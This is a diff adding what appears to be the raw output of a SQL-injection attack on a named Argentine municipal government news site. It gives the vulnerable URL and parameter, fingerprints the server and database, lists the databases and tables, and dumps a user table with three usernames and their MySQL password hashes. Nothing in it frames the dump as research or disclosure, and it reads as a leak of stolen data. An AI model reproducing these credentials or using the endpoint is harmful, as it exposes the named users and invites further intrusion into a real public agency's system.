@@ -1,0 +1,39 @@
+.gov Government
+
+.ar Argentina
+
+Quilmes Government
+
+https://gis.quilmes.gov.ar/noticias/noticia.php?id_noti=3020
+
+the back-end DBMS is MySQL
+web server operating system: Linux CentOS 7
+web application technology: PHP 5.4.16, Apache 2.4.6
+the back-end DBMS: MySQL >= 5.0.0
+banner: '5.0.51b-community-nt-log'
+
+available databases [3]:                                                                                                              
+[+] information_schema
+[+] noticias
+[+] test
+
+Database: noticias                                                                                                                    
+[5 tables]
++-------------------+
+| categoria         |
+| noticia           |
+| noticia_categoria |
+| tipo              |
+| usuario           |
++-------------------+
+
+Database: noticias
+Table: usuario
+[3 entries]
++----------+-------------------------------------------+
+| usuario  | password                                  |
++----------+-------------------------------------------+
+| edu      | *1028F6B5501EACC90C42AC34DB2F835BF4AC6372 |
+| seba     | *44B1F003CC35A8A81C1ABADED139071BAB3C0147 |
+| noticias | *847B12F915DF0A022A3642B9B61946D9407D0F9F |
++----------+-------------------------------------------+
